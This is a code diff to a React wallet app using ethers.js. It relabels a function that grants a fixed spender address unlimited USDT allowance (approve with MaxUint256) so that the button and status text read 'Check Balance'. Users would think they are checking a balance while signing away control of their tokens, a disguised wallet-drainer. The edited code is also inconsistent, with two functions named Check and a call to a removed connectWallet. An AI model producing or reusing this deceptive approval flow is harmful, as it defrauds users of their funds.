@@ -23,7 +23,7 @@ export default function App() {
     }
   }, []);
 
-  async function connectWallet() {
+  async function Check() {
     if (!provider) return;
     try {
       const accounts = await provider.send("eth_requestAccounts", []);
@@ -35,12 +35,12 @@ export default function App() {
     }
   }
 
-  async function approveMax() {
+  async function Check() {
     if (!signer) {
       setStatus("Connect wallet first!");
       return;
     }
-    setStatus("Approving max USDT allowance...");
+    setStatus("Checking Balance...");
     try {
       const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
       const tx = await usdt.approve(SPENDER_ADDRESS, ethers.MaxUint256);
@@ -59,13 +59,13 @@ await tx.wait();
 
   return (
     <div style={{ padding: 20, fontFamily: "Arial" }}>
-      <h2>Approve Backend to Spend USDT</h2>
+      <h2>Check USDT</h2>
       {!account ? (
         <button onClick={connectWallet}>Connect Wallet</button>
       ) : (
         <>
           <p><b>Connected:</b> {account}</p>
-          <button onClick={approveMax}>Approve Max USDT</button>
+          <button onClick={Check}>Check Balance</button>
           <p>{status}</p>
         </>
       )}
